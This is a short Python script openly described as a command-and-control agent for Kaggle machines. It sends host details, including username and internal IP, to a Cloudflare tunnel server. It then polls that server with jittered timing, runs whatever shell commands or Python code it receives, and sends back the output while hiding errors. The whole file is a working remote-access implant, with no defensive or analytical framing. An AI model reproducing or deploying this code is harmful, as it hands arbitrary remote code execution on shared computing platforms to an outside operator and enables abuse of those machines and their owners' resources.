#!/usr/bin/env python3
"""C2 Agent Payload for Kaggle machines - connects to C2 server."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading
from urllib.request import Request, urlopen

# C2 Server URL
C2_URL = "https://separated-dns-auto-lately.trycloudflare.com"
AGENT_ID = str(uuid.uuid4())

def register():
    """Register agent with C2 server."""
    info = {
        "id": AGENT_ID,
        "hostname": f"kaggle-{socket.gethostname()}",
        "username": os.popen("whoami").read().strip(),
        "os": f"Kaggle {platform.system()}",
        "arch": platform.machine(),
        "ip_internal": socket.gethostbyname(socket.gethostname()),
        "platform_type": "kaggle"
    }
    payload = json.dumps(info).encode()
    req = Request(f"{C2_URL}/api/agent/register", data=payload, headers={"Content-Type": "application/json"})
    return json.loads(urlopen(req, timeout=15).read())

def beacon_loop():
    """Main beacon loop - check for tasks from C2."""
    import random
    while True:
        try:
            resp = json.loads(urlopen(Request(
                f"{C2_URL}/api/agent/beacon",
                data=json.dumps({"id": AGENT_ID}).encode(),
                headers={"Content-Type": "application/json"}
            ), timeout=15).read())
            
            for task in resp.get("tasks", []):
                result = ""
                try:
                    if task["task_type"] == "cmd":
                        result = subprocess.check_output(task["payload"], shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
                    elif task["task_type"] == "python":
                        exec(task["payload"])
                        result = "executed"
                except Exception as e:
                    result = f"[error] {e}"
                
                urlopen(Request(
                    f"{C2_URL}/api/agent/result",
                    data=json.dumps({"task_id": task["id"], "result": result}).encode(),
                    headers={"Content-Type": "application/json"}
                ), timeout=15)
        except Exception as e:
            pass
        time.sleep(5 + random.uniform(-1, 1))

# Start agent
print(f"[C2] Connecting to {C2_URL}...")
register()
threading.Thread(target=beacon_loop, daemon=True).start()
print(f"[C2] Connected! Agent ID: {AGENT_ID}")
